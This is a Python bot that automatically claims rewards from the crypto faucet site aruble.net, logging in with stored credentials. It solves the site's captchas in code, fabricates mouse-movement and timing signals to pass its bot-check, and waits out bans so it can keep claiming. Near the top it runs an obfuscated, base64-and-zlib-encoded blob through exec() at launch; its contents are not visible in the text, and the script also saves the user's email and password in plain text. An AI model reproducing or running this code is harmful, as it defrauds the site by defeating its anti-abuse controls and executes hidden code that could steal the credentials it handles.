#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ARUBLE AUTO FAUCET CLAIM — Python port with ZeinthHub DevOps UI style.
"""

import json
import os
import re
import secrets
import sys
import time
import datetime
import shutil
from collections import Counter

import requests

# ------------------- CONFIG (OBFUSCATED DECODER) -------------------
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
# ---------------------------------------------

C_CYAN    = '\033[96m'
C_GREEN   = '\033[92m'
C_YELLOW  = '\033[93m'
C_BLUE    = '\033[94m'
C_MAGENTA = '\033[95m'
C_WHITE   = '\033[97m'
C_DIM     = '\033[90m'
C_RESET   = '\033[0m'
C_RED     = '\033[91m'
C_BOLD    = '\033[1m'

BOX_W = 51

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

DEV_PROFILE = {
    "userAgent": UA,
    "language": "en-GB",
    "screen": "412x915",
    "colorDepth": 24,
    "tzOffset": -330,
    "hwConcurrency": 8,
    "platform": "Linux armv8l",
}

stop_flag = False


def now_str():
    return datetime.datetime.now().strftime("%H:%M:%S")


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def get_pad():
    try:
        term_width = shutil.get_terminal_size((60, 20)).columns
    except:
        term_width = 60
    return max(0, (term_width - BOX_W) // 2)


def print_c(colored_text):
    pad = get_pad()
    print(" " * pad + colored_text)


def log_c(status, color, message, delay=0.2):
    time_str = datetime.datetime.now().strftime("%H:%M:%S")
    pad = get_pad()
    sys.stdout.write(" " * pad + f" {C_DIM}[{time_str}]{C_RESET} [{color}{C_BOLD}{status:^6}{C_RESET}] {message}\n")
    sys.stdout.flush()
    time.sleep(delay)


def log(msg):
    t = datetime.datetime.now().strftime("%H:%M:%S")
    pad = get_pad()
    print(" " * pad + f"{C_DIM}[{t}]{C_RESET} {C_CYAN}│{C_RESET} {C_WHITE}{msg}{C_RESET}", flush=True)


def rnd(a, b):
    return a + (b - a) * __import__("random").random()


# ---------------- credentials (aruble.json) ----------------
def load_credentials():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                d = json.load(f)
            return d.get("email") or "", d.get("password") or ""
        except Exception:
            pass
    return "", ""


def save_credentials(email, password):
    data = {"email": email, "password": password}
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        log(f"warning: could not save {CONFIG_FILE}: {e}")
        return False


def ask_credentials(cli_email, cli_pass):
    cfg_email, cfg_pass = load_credentials()
    email = cli_email or cfg_email
    password = cli_pass or cfg_pass

    if not email:
        email = input(f"{C_CYAN}Email: {C_RESET}").strip()
    if not password:
        try:
            import getpass
            password = getpass.getpass(f"{C_CYAN}Password: {C_RESET}")
        except Exception:
            password = input(f"{C_CYAN}Password: {C_RESET}").strip()
    if not email:
        raise RuntimeError("email required")
    if not password:
        raise RuntimeError("password required")

    save_credentials(email, password)
    if (cli_email or cli_pass):
        log(f"credentials saved to {CONFIG_FILE}")
    return email, password


# ---------------- fingerprint ----------------
def get_fingerprint(profile=DEV_PROFILE):
    data = "|".join([
        profile["userAgent"], profile["language"], profile["screen"],
        str(profile["colorDepth"]), str(profile["tzOffset"]),
        str(profile["hwConcurrency"]), profile["platform"],
    ])
    h = 0
    for ch in data:
        h = ((h << 5) - h) + ord(ch)
        h &= 0xFFFFFFFF
    if h >= 0x80000000:
        h -= 0x100000000
    return "%08x" % abs(h)


# ---------------- math solver ----------------
def eval_math(q):
    m = re.search(r"(-?\d+)\s*([+\-*x×÷/])\s*(-?\d+)", q)
    if not m:
        raise RuntimeError(f"cannot parse math question: {q}")
    a, op, b = int(m.group(1)), m.group(2), int(m.group(3))
    if op == "+":
        return str(a + b)
    if op == "-":
        return str(a - b)
    if op in ("*", "x", "×"):
        return str(a * b)
    if op in ("/", "÷"):
        return str(int(a / b)) if b else str(a)
    raise RuntimeError(f"unknown op {op}")


# ---------------- http client ----------------
class ArubleClient:
    def __init__(self, verbose=True, dash=None):
        self.verbose = verbose
        self.dash = dash
        self.s = requests.Session()
        self.s.headers.update({
            "User-Agent": UA,
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": BASE,
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        })
        self.csrf = None

    def log(self, msg):
        if not self.verbose:
            return
        log(msg)

    def _get(self, path, referer=None):
        h = {}
        if referer:
            h["Referer"] = referer
        max_retries = 3
        for attempt in range(max_retries):
            try:
                return self.s.get(BASE + path, headers=h, timeout=30)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt == max_retries - 1:
                    raise e
                self.log(f"  [network warning] GET failed, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(3)

    def _post_form(self, path, data, referer=None):
        h = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        if referer:
            h["Referer"] = referer
        max_retries = 3
        for attempt in range(max_retries):
            try:
                return self.s.post(BASE + path, data=data, headers=h, timeout=30)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
                if attempt == max_retries - 1:
                    raise e
                self.log(f"  [network warning] POST failed, retrying ({attempt + 1}/{max_retries})...")
                time.sleep(3)

    @staticmethod
    def _json(resp, what):
        try:
            return resp.json()
        except Exception:
            raise RuntimeError(f"{what}: HTTP {resp.status_code}, not JSON: {resp.text[:200]!r}")

    def init_session(self):
        r = self._get("/", referer=BASE + "/")
        if r.status_code != 200:
            raise RuntimeError(f"login page: HTTP {r.status_code}")
        m = re.search(r'csrf-token"[\s>]+content="([^"]+)"', r.text)
        if not m:
            raise RuntimeError("no csrf token in login page")
        self.csrf = m.group(1)
        self.log(f"[init] session ok, csrf={self.csrf[:16]}...")

    def fetch_challenge(self):
        j = self._json(self._get("/captcha/challenge", referer=BASE + "/"), "challenge")
        if j.get("banned"):
            self.log("  challenge: banned")
        elif j.get("gate_required"):
            self.log(f"  challenge: gate ({j.get('hold_ms', DEFAULT_HOLD_MS)}ms hold)")
        else:
            self.log(f"  challenge: {j['type']}")
        return j

    def gate_start(self):
        return self._json(self._post_form("/captcha/gate/start", {"_csrf_token": self.csrf}), "gate/start")

    def gate_complete(self, gate_key, moves):
        return self._json(self._post_form("/captcha/gate/complete", {
            "gate_key": gate_key, "moves": moves, "_csrf_token": self.csrf
        }), "gate/complete")

    def verify(self, key, answer):
        return self._json(self._post_form("/captcha/verify", {
            "key": key, "answer": answer, "_csrf_token": self.csrf
        }), "verify")

    def pass_gate(self):
        gs = self.gate_start()
        if not gs.get("success"):
            raise RuntimeError(f"gate/start failed: {gs}")
        hold_ms = int(gs.get("hold_ms", DEFAULT_HOLD_MS))
        self.log(f"  gate started (hold={hold_ms}ms)")
        time.sleep(hold_ms / 1000.0 + rnd(0.05, 0.35))
        moves = max(3, int(hold_ms / 1000.0 * rnd(12, 40)))
        gc = self.gate_complete(gs["gate_key"], moves)
        if not gc.get("success"):
            raise RuntimeError(f"gate/complete failed: {gc}")
        self.log(f"  gate passed (moves={moves})")

    @staticmethod
    def build_answer(ch):
        t = ch["type"]
        if t == "slide":
            return str(ch["target_pct"])
        if t == "icon_order":
            idmap = {it["icon"]: it["id"] for it in ch["display"]}
            seq = [idmap[icon] for icon in ch["prompt"]]
            return json.dumps(seq, separators=(",", ":"))
        if t == "least_repeat":
            counts = Counter(it["icon"] for it in ch["grid"])
            least = min(counts.values())
            return str(next(it["id"] for it in ch["grid"] if counts[it["icon"]] == least))
        if t == "drag_dot":
            return json.dumps({"x": round(ch["target_x"]), "y": round(ch["target_y"])}, separators=(",", ":"))
        raise RuntimeError(f"unknown challenge type: {t} ({ch})")

    def solve_one(self):
        for _ in range(MAX_ATTEMPTS):
            ch = self.fetch_challenge()
            if ch.get("banned"):
                raise RuntimeError(f"temp-banned: {ch.get('message', '')} (retry in {ch.get('remaining_seconds', 0)}s)")
            if ch.get("gate_required"):
                self.pass_gate()
                continue
            answer = self.build_answer(ch)
            time.sleep(rnd(0.8, 2.2))
            res = self.verify(ch["key"], answer)
            if res.get("success"):
                self.log("  captcha verified")
                return res.get("token", "")
            if res.get("banned"):
                raise RuntimeError(f"temp-banned at verify: {res.get('message', '')} (retry in {res.get('remaining_seconds', 0)}s)")
            if res.get("expired"):
                self.log("  wrong answer / expired -> fresh challenge")
                time.sleep(1.2)
                continue
            raise RuntimeError(f"verify failed: {res}")
        raise RuntimeError("too many attempts without a verifiable challenge")

    def login(self, email, password):
        token = self.solve_one()
        device_fp = secrets.token_hex(16)
        res = self._post_form("/api/auth/login", {
            "_csrf_token": self.csrf, "email": email, "password": password,
            "captcha_token": token, "remember_me": "1",
            "device_fingerprint": device_fp,
        }, referer=BASE + "/")
        ok = res.status_code == 200 and res.json().get("success")
        self.log(f"  login {'ok' if ok else 'failed'} (http {res.status_code})")
        if not ok:
            raise RuntimeError(f"login failed: {res.text[:200]}")
        return True

    def bot_check(self, return_to="/faucet"):
        page = self._get(f"/bot-check?return_to={requests.utils.quote(return_to)}", referer=BASE + "/")
        if page.status_code != 200:
            raise RuntimeError(f"bot-check page: HTTP {page.status_code}")
        token = re.search(r'name="token"\s+value="([^"]+)"', page.text)
        question = re.search(r'botcheck-question">([^<]+)<', page.text)
        math_field = re.search(r'name="(q_[a-f0-9]+)"\s+id="mathAnswer"', page.text)
        time_field = re.search(r"fieldTime:\s*'([^']+)'", page.text)
        start_ms = re.search(r"challengeStartMs:\s*(\d+)", page.text)
        if not all([token, question, math_field, time_field, start_ms]):
            raise RuntimeError("bot-check page fields not found")
        token, question, math_field, time_field = (token.group(1), question.group(1),
                                                 math_field.group(1), time_field.group(1))
        start_ms = int(start_ms.group(1))
        answer = eval_math(question)
        self.log(f"  bot-check: math {question} = {answer}")

        captcha_token = self.solve_one()
        self.log("  bot-check captcha ok")

        solve_time = max(3000, int(time.time() * 1000) - start_ms)
        seconds = solve_time / 1000.0
        mouse_moves = int(seconds * rnd(5, 14))
        linear_count = int(mouse_moves * rnd(0.1, 0.35))

        data = {
            "token": token,
            "captcha_token": captcha_token,
            "website": "",
            math_field: answer,
            time_field: solve_time,
            "mouse_moves": mouse_moves,
            "mouse_linear": linear_count,
            "integrity_signals": "",
        }
        res = self._post_form("/bot-check/verify", data, referer=BASE + "/bot-check")
        j = res.json()
        self.log("  bot-check passed")
        if not j.get("success"):
            raise RuntimeError(f"bot-check failed: {res.text[:200]}")
        return j

    def read_faucet(self):
        page = self._get("/faucet", referer=BASE + "/")
        if page.status_code != 200:
            return None
        m = re.search(r"var FAUCET_DATA = (\{[\s\S]*?\n\});", page.text)
        if not m:
            return None
        try:
            data = json.loads(m.group(1))
        except Exception:
            return None
        ct = re.search(r'id="statClaims">(\d+)<', page.text)
        return {
            "acc_balance": data.get("accBalance"),
            "coin_reward": data.get("coinReward"),
            "coin_symbol": data.get("coinSymbol"),
            "cooldown": int(data.get("cooldownSeconds", COOLDOWN_SECONDS)),
            "multiplier": data.get("multiplier"),
            "claims_today": int(ct.group(1)) if ct else None,
        }

    def faucet_status(self):
        r = self._get("/api/earn-badges", referer=BASE + "/faucet")
        j = self._json(r, "earn-badges")
        f = j.get("faucet", {}) if j else {}
        return {
            "available": bool(f.get("available")),
            "enabled": bool(f.get("enabled", True)),
            "cooldown": int(f.get("cooldown", 0)),
        }

    def claim_once(self, fp):
        time.sleep(rnd(0.6, 1.5))
        page = self._get("/faucet", referer=BASE + "/")
        if page.status_code == 401:
            raise SessionExpired("session expired")
        if page.status_code != 200:
            raise RuntimeError(f"faucet page: HTTP {page.status_code}")

        captcha_token = self.solve_one()
        self.log("  claim captcha ok")
        res = self._post_form("/faucet/claim", {
            "dest": "account", "wc_id": 0, "captcha_token": captcha_token,
            "fp": fp, "_csrf_token": self.csrf,
        }, referer=BASE + "/faucet")
        j = self._json(res, "claim")
        if j.get("success"):
            self.log(f"  claimed +{j['amount']} {j['symbol']} (balance {j['balance_after']})")
        return j


class SessionExpired(RuntimeError):
    pass


def cooldown_seconds(msg):
    m = re.search(r"(\d+)m\s*(\d+)s", msg or "")
    if m:
        return int(m.group(1)) * 60 + int(m.group(2)) + 3
    m = re.search(r"in (\d+)s", msg or "")
    if m:
        return int(m.group(1)) + 3
    return 320


def re_auth(client, email, password):
    client.init_session()
    client.login(email, password)
    client.bot_check("/faucet")
    log("re-authenticated (login + bot-check)")


# --- COUNTDOWN TIMER MUNDUR ---
def countdown(seconds):
    seconds = int(max(0, seconds))
    for w in range(seconds, 0, -1):
        if stop_flag:
            break
        t_str = datetime.datetime.now().strftime("%H:%M:%S")
        pad = get_pad()
        sys.stdout.write("\r" + " " * pad + f" {C_DIM}[{t_str}]{C_RESET} {C_YELLOW}[zZz]{C_RESET} {C_DIM}Sleeping {w}s before next claim...{C_RESET}   ")
        sys.stdout.flush()
        time.sleep(1)
    print()


# ---------------- UI ----------------
def show_devops_ui():
    clear_screen()
    INNER_W = BOX_W - 2
    
    top_border = f"┏{'━' * INNER_W}┓"
    mid_border = f"┣{'━' * INNER_W}┫"
    bot_border = f"┗{'━' * INNER_W}┛"
    
    title = "Z E I N TH H U B   P R O J E C T".center(INNER_W)
    subtitle = "Automated Faucet Exploitation & Glyph Recognition".center(INNER_W)
    
    print_c(f"{C_CYAN}{top_border}{C_RESET}")
    print_c(f"{C_CYAN}┃{C_RESET}{C_BOLD}{C_WHITE}{title}{C_RESET}{C_CYAN}┃{C_RESET}")
    print_c(f"{C_CYAN}┃{C_RESET}{C_DIM}{subtitle}{C_RESET}{C_CYAN}┃{C_RESET}")
    print_c(f"{C_CYAN}{mid_border}{C_RESET}")
    
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    lbl_time = "Timestamp".ljust(11)
    lbl_sys  = "Subsystem".ljust(11)
    lbl_main = "Maintainer".ljust(11)
    
    val_sys = "Aruble Faucet Auto-Claim"
    val_main = "@Bleszh (Tg)"
    
    s_time = f" ➔ {lbl_time} : {now}"
    s_sys  = f" ➔ {lbl_sys} : {val_sys}"
    s_main = f" ➔ {lbl_main} : {val_main}"
    
    pad_t = " " * (INNER_W - len(s_time))
    pad_s = " " * (INNER_W - len(s_sys))
    pad_m = " " * (INNER_W - len(s_main))
    
    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_time}{C_RESET} : {C_CYAN}{now}{C_RESET}{pad_t}{C_CYAN}┃{C_RESET}")
    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_sys}{C_RESET} : {C_YELLOW}{val_sys}{C_RESET}{pad_s}{C_CYAN}┃{C_RESET}")
    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_main}{C_RESET} : {C_GREEN}{val_main}{C_RESET}{pad_m}{C_CYAN}┃{C_RESET}")
    print_c(f"{C_CYAN}{bot_border}{C_RESET}")
    
    print_c(f"{C_CYAN}{'v2.1-stable'.rjust(BOX_W)}{C_RESET}")
    print()
    
    time.sleep(0.5)
    print_c(f"{C_DIM}{'-' * BOX_W}{C_RESET}")
    
    log_c("INFO", C_BLUE, "Initializing deployment sequence...", 0.4)
    log_c("OK", C_GREEN, "Python environment verified.", 0.3)
    log_c("OK", C_GREEN, "Dependency 'requests' loaded.", 0.5)
    log_c("OK", C_GREEN, "SSL Context built successfully.", 0.3)
    log_c("OK", C_GREEN, "Network gateway reachable.", 0.6)
    
    print_c(f"{C_DIM}{'-' * BOX_W}{C_RESET}")
    
    time.sleep(0.3)
    print_c(f" {C_MAGENTA}DEPLOYMENT TARGETS:{C_RESET}{' ' * (BOX_W - 20)}")
    
    t1 = "   [+] Target Host      -> https://aruble.net"
    t2 = "   [+] Captcha Provider -> Gate & Icon Solver"
    t3 = "   [+] Payload          -> Automated Miner & Claimer"
    
    print_c(f"   {C_DIM}[+]{C_RESET} Target Host      -> {C_WHITE}https://aruble.net{C_RESET}{' ' * (BOX_W - len(t1))}")
    print_c(f"   {C_DIM}[+]{C_RESET} Captcha Provider -> {C_WHITE}Gate & Icon Solver{C_RESET}{' ' * (BOX_W - len(t2))}")
    print_c(f"   {C_DIM}[+]{C_RESET} Payload          -> {C_WHITE}Automated Miner & Claimer{C_RESET}{' ' * (BOX_W - len(t3))}")
    
    print_c(f"{C_CYAN}{'━' * BOX_W}{C_RESET}")
    time.sleep(0.5)
    
    msg = ">> SYSTEM READY. Handing over to main process..."
    print_c(f" {C_GREEN}{C_BOLD}{msg}{C_RESET}")
    time.sleep(1)
    print()


# ---------------- main ----------------

def _refresh_today(stats, client, msg=None):
    info = client.read_faucet()
    if info:
        try:
            stats["balance"] = float(info["acc_balance"])
        except (TypeError, ValueError):
            pass
        if info.get("claims_today") is not None:
            stats["today"] = info["claims_today"]
    stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
    if msg:
        log(msg)


def main():
    global stop_flag


    show_devops_ui()

    args = sys.argv[1:]
    keywords = {"all", "today", "max"}
    pos = [a for a in args if not a.startswith("-")]
    non_num = [a for a in pos if not re.fullmatch(r"[0-9]+", a) and a.lower() not in keywords]
    num = next((a for a in pos if re.fullmatch(r"[0-9]+", a)), None)
    all_mode = (num is None) or any(a.lower() in keywords for a in pos)
    cli_email = non_num[0] if non_num and "@" in non_num[0] else ""
    cli_pass = non_num[1] if len(non_num) > 1 and "@" not in non_num[1] else ""
    quiet = "-q" in args

    email, password = ask_credentials(cli_email, cli_pass)
    numeric = int(num) if num else None
    max_claims = None if all_mode else numeric

    if not numeric and not all_mode:
        t = input(f"{C_CYAN}How many times to claim? (e.g., 10): {C_RESET}").strip()
        try:
            max_claims = int(t)
        except ValueError:
            max_claims = None

    dash = None
    client = ArubleClient(verbose=not quiet, dash=None)
    stats = {"balance": None, "done": 0, "max": 0, "cooldown": 0,
             "success": 0, "blocked": 0, "bans": 0, "botchecks": 1, "relogins": 0,
             "account": email, "history": [],
             "today": 0, "today_max": DAILY_CLAIM_MAX, "remaining": 0,
             "all": all_mode, "enabled": True, "earned": 0.0}

    target = None
    try:
        re_auth(client, email, password)
        fp = get_fingerprint()

        info = client.read_faucet()
        if info:
            try:
                stats["balance"] = float(info["acc_balance"])
            except (TypeError, ValueError):
                pass
            if info.get("claims_today") is not None:
                stats["today"] = info["claims_today"]
            log(f"balance {info['acc_balance']} {info['coin_symbol']} | "
                f"reward {info['coin_reward']} x{info['multiplier']} | "
                f"claims today {info['claims_today']}/{DAILY_CLAIM_MAX}")

        st = client.faucet_status()
        stats["enabled"] = st["enabled"]
        if not st["enabled"]:
            log("faucet is disabled on the site — exiting")
        stats["remaining"] = max(stats["today_max"] - stats["today"], 0)

        if max_claims is None:
            target = stats["remaining"]
        else:
            target = min(max_claims, stats["remaining"]) if stats["remaining"] > 0 else 0
        stats["max"] = target

        if target <= 0:
            log(f"nothing to claim — today {stats['today']}/{stats['today_max']} "
                f"({stats['remaining']} left)")
            return

        log(f"fp={fp} | target {target} claim(s) "
            f"({'all remaining today' if all_mode else 'fixed count'})")

        while stats["done"] < target:
            if stop_flag:
                break
            if all_mode:
                st = client.faucet_status()
                stats["enabled"] = st["enabled"]
                if not st["enabled"]:
                    log("faucet disabled by site — stopping")
                    break

            
            print(f"\n {C_MAGENTA}╭{'━'*51}╮{C_RESET}")
            print(f" {C_MAGENTA}┃{C_RESET} {C_WHITE}CLAIM ROUND {C_CYAN}{stats['done']+1:02d}{C_RESET} {C_MAGENTA}➔{C_RESET} {C_YELLOW}TARGET: {target}{C_RESET}{' ' * 23} {C_MAGENTA}┃{C_RESET}")
            print(f" {C_MAGENTA}╰{'━'*51}╯{C_RESET}")

            try:
                res = client.claim_once(fp)
            except SessionExpired:
                stats["relogins"] += 1
                log("session expired -> re-auth")
                re_auth(client, email, password)
                _refresh_today(stats, client)
                continue
            except RuntimeError as e:
                if "temp-banned" in str(e):
                    stats["bans"] += 1
                    log(f"[banned] waiting {TEMP_BAN_WAIT}s")
                    countdown(TEMP_BAN_WAIT)
                    continue
                raise

            if res.get("success"):
                stats["done"] += 1
                stats["success"] += 1
                try:
                    stats["balance"] = float(res.get("balance_after"))
                    stats["earned"] += float(res.get("amount", 0))
                except (TypeError, ValueError):
                    pass
                stats["today"] = int(res.get("claims_today", stats["today"]))
                stats["today_max"] = int(res.get("claims_max", stats["today_max"]))
                stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
                
                t = datetime.datetime.now().strftime("%H:%M:%S")
                print(f"\n {C_DIM}[{t}]{C_RESET} {C_GREEN}{C_BOLD}╰─> SUCCESS: +{res['amount']} {res['symbol']} (balance: {res['balance_after']}) [{stats['today']}/{stats['today_max']}]{C_RESET}")
                
                if all_mode and stats["today"] >= stats["today_max"]:
                    log(f"daily cap reached ({stats['today']}/{stats['today_max']}) — done")
                    break
                if stats["done"] < target:
                    wait_time = int(res.get("next_claim_in", COOLDOWN_SECONDS) + rnd(3, 12))
                    countdown(wait_time)
                continue

            msg = str(res.get("message", ""))
            redirect = str(res.get("redirect", ""))
            if "bot-check" in msg or "security check" in msg or "bot-check" in redirect:
                stats["blocked"] += 1
                stats["botchecks"] += 1
                log("bot-check re-required -> redoing")
                client.bot_check("/faucet")
                time.sleep(rnd(1.5, 2.5))
                continue
            if "login" in msg:
                stats["relogins"] += 1
                log("claim says not logged in -> re-auth")
                re_auth(client, email, password)
                continue
            if re.search(r"\d+m\s*\d+s|in \d+s", msg):
                wait = cooldown_seconds(msg)
                stats["blocked"] += 1
                log(f"cooldown: {msg if len(msg) < 80 else msg[:77] + '...'}")
                _refresh_today(stats, client)
                countdown(wait)
                continue
            log(f"unknown claim response: {json.dumps(res)} — retry in 60s")
            countdown(60)

    except KeyboardInterrupt:
        stop_flag = True
        log("Interrupted by user")
    finally:
        log(f"Exited. claimed {stats['done']}/{target or 0} today {stats['today']}/{stats['today_max']} "
            f"| earned +{stats['earned']:.2f} COINS | success {stats['success']} | "
            f"blocked {stats['blocked']} | bans {stats['bans']}")


if __name__ == "__main__":
    main()
